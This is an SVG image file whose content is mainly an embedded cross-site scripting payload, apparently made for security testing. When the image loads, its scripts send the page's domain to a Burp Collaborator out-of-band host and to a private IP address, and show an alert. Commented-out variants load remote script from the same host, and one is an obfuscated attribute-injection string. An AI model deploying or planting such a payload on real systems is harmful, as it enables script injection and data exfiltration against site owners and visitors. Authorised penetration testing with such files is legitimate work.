<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC
"-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg 
    width="200" height="200" zoomAndPan="disable"        
    xmlns="http://www.w3.org/2000/svg"        
    xmlns:xlink="http://www.w3.org/1999/xlink"        
    xml:space="preserve">

  <script>
  // Get the current domain name.
var domain = document.domain;

// Create a new XMLHttpRequest object.
var xhr = new XMLHttpRequest();

// Open a GET request to the Burp Collaborator server.
xhr.open('GET', 'https://mzp9gr4m6fxwunf3mvfhf3008rei28qx.oastify.com/?domain=' + domain);

// Set the request headers.
xhr.setRequestHeader('Content-Type', 'application/json');

// Set the callback function for the request.
xhr.onload = function() {
  // Convert the response to a JSON object.
  var response = JSON.parse(this.responseText);

  // Get the domain name from the response.
  var domain = response.domain;

  // Return the domain name.
  return domain;
};

// Send the request.
xhr.send();
  </script>
    <!-- <script xlink:href="https://mzp9gr4m6fxwunf3mvfhf3008rei28qx.oastify.com/?domain=${document.domain}"/> -->

    <!-- <script xlink:href="https://mzp9gr4m6fxwunf3mvfhf3008rei28qx.oastify.com.com"> -->

    <script>
        var i=new Image;i.src="http://172.20.19.53/?"+document.domain;
    </script>

    <script>       
        //<![CDATA[         
        alert(document.domain);       
        ]]>     
    </script>   

    <!-- 
onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/https://mzp9gr4m6fxwunf3mvfhf3008rei28qx.oastify.com/).slice(2), document.documentElement.appendChild(s))//'
     -->
</svg>

